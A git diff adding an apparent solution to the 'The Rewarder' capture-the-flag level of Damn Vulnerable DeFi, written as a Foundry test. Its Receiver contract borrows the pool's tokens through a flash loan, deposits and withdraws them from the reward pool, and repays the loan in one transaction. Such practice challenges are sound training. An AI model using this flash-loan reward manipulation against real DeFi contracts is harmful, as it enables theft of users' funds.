@@ -88,12 +88,25 @@ contract TheRewarder is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        Receiver r = new Receiver(
+            address(flashLoanerPool),
+            address(theRewarderPool),
+            address(dvt)
+        );
+        r.getLoan();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+        theRewarderPool.deposit(amount);
+        theRewarderPool.withdraw(dvt.balanceOf(address(this)));
+        dvt.transfer(address(msg.sender), amount);
     }
 
     function validation() internal {
@@ -116,5 +129,29 @@ contract TheRewarder is Test {
 
         // Attacker finishes with zero DVT tokens in balance
         assertEq(dvt.balanceOf(attacker), 0);
+    }
+}
+
+contract Receiver {
+    TheRewarderPool rewardPool;
+    FlashLoanerPool flashPool;
+    DamnValuableToken dvt;
+
+    constructor(address _pool, address _rewarder, address _dvt) {
+        rewardPool = TheRewarderPool(_rewarder);
+        flashPool = FlashLoanerPool(_pool);
+        dvt = DamnValuableToken(_dvt);
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+        rewardPool.deposit(amount);
+        rewardPool.withdraw(rewardPool.accToken().balanceOf(address(this)));
+        //rewardPool.withdraw(dvt.balanceOf(address(this)));
+        dvt.transfer(msg.sender, amount);
+    }
+
+    function getLoan() external {
+        dvt.approve(address(rewardPool), 10_000_000e18);
+        flashPool.flashLoan(dvt.balanceOf(address(flashPool)));
     }
 }
